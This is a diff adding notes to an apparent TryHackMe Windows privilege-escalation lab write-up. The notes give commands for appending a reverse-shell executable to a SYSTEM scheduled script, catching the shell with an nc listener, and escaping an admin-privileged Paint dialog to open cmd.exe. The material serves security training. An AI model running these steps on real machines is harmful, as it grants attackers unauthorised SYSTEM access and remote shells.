@@ -1468,11 +1468,195 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 <details>
   <summary>Scheduled Tasks</summary>
+
+- <details>
+     <summary>Tip</summary>
+     
+     > ### here we are in room from THM and we know that the Scheduled task is **`C:\DevTools\CleanUp.ps1`**
+     > but in real world how to know ??
+     
+     
+     > - ### **`To view all Scheduled Tasks in system`**
+     
+     ## **`CMD`**
+     
+     ```ruby
+     schtasks /query /fo LIST /v
+     ```
+     
+     
+     ## **`powershell`**
+     
+     ```ruby
+     Get-ScheduledTask | Format-List *
+     ```
+     
+     ## **`GUI`**
+     
+     ```ruby
+     taskschd.msc
+     ```
+     
+     -----
+     
+     > - ### **`To view all Scheduled Tasks that work as SYSTEM`**
+     
+     ## **`powershell`**
+     
+     ```ruby
+     Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | Format-List *
+     ```
+     
+     ---
+     
+     > ## Where tasks files are stored in?
+     
+     ```ruby
+     C:\Windows\System32\Tasks
+     ```
+     
+     
+     
+
+  </details>
+
+
+
+## 1. View the content of the PowerShell script
+
+```ruby
+type C:\DevTools\CleanUp.ps1
+```
+
+- **`type`** : A Windows command that displays the contents of any text file.
+- **`C:\DevTools\CleanUp.ps1`** : This is a PowerShell Script file.
+
+> Purpose: To understand what the script is doing (it may be deleting logs or cleaning folders).
+
+
+<img width="679" height="143" alt="image" src="https://github.com/user-attachments/assets/b94aed7f-ff74-4470-947c-f485eadd8d7b" />
+
+
+
+> ---
+> ### 📌 _NOte → "The script seems to be running as SYSTEM every minute"_
+> ---
+
+
+## 2. Check file permissions
+
+
+```ruby
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+```
+
+<img width="661" height="322" alt="image" src="https://github.com/user-attachments/assets/9e3654bc-90c7-49d9-97ea-e27c22e1125f" />
+
+
+
+> ---
+> ### 📌 _Goal → Make sure that we can write (Write/Modify) to this script._
+> ---
+
+## 3. Adding a malicious line to the script
+
+```ruby
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+```
+
+
+> ---
+> ### 📌 _Goal → o make the script run every time your program, reverse.exe, runs with it._
+> ---
+
+## 4. Open Listener on kali
+
+
+```ruby
+nc -nvlp 4444
+```
+
+
+<img width="1394" height="262" alt="image" src="https://github.com/user-attachments/assets/6061925d-c493-49c9-87e9-9d460e8f70e5" />
+
+
+
+
+
+     
 </details>
+
+
+
+
+
+
+
+
+
+
+
+
 
 <details>
   <summary>Insecure GUI Apps</summary>
+
+> ---
+> ### After you enter RDP, you will find a shortcut named “AdminPaint” on your desktop.
+
+> When you step on it, it launches the Paint program (mspaint.exe), but it is not normal → it starts using Administrator's Privileges.
+
+> This means that you have a GUI (Paint) program running with higher privileges than you.
+> 
+> ---
+
+
+## 1. Check privileges “AdminPaint” work with it 
+
+```ruby
+tasklist /V | findstr mspaint.exe
+```
+
+- **`tasklist /v`** : It displays all running processes in detail (PID, program name, which user runs it).
+- **`| findstr mspaint.exe`** : Filter the results to only answer the Paint line.
+
+
+
+<img width="952" height="183" alt="image" src="https://github.com/user-attachments/assets/1f204b37-f268-4150-a7af-762d781a5ebf" />
+
+
+## 2. Exploiting the Open Dialog
+
+- Open Paint → from the menu press File → Open.
+
+- You will receive a Dialog Box for opening files.
+
+- Now, instead of writing an image name, you will write in the navigation bar:
+
+
+```ruby
+file://c:/windows/system32/cmd.exe
+```
+
+<img width="435" height="131" alt="image" src="https://github.com/user-attachments/assets/98034852-152b-4282-aa77-cffec62130bc" />
+
+- click ``enter`` not **`open`** button
+
+<img width="1023" height="601" alt="image" src="https://github.com/user-attachments/assets/1edb72c0-99e9-4b39-aa86-cfa71ebeff91" />
+
+     
 </details>
+
+
+
+
+
+
+
+
+
+
+
 
 <details>
   <summary>Startup Apps</summary>
